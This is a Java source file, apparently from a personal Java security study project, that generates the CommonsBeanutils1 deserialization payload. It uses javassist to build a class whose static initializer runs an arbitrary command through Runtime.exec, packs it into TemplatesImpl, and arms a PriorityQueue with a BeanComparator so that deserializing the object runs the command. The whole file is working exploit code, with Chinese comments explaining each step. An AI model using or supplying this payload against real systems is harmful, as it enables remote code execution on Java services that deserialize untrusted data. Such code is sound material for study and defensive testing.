package com.pinger.javasec.common;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

public class CommonsBeanutils1 {

    /**
     * 需要一个空类作为javassist的模板
     */
    public static class Placeholder {}

    public static Object getPayload(String cmd)throws Exception{
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CommonsBeanutils1.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CommonsBeanutils1.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\""+cmd+"\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();

        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
        Class<? extends TemplatesImpl> clazz = templates.getClass();
        // 将恶意字节码填充到TemplatesImpl对象中
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evalByte});

        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
        Field name = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"p1n93r");

        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Class<? extends BeanComparator> comparatorClazz = comparator.getClass();
        Field property = comparatorClazz.getDeclaredField("property");
        property.setAccessible(true);
        property.set(comparator,"outputProperties");

        // switch contents of queue
        Class<? extends PriorityQueue> queueClass = queue.getClass();
        Field queueField = queueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        final Object[] queueArray = (Object[]) queueField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }
}
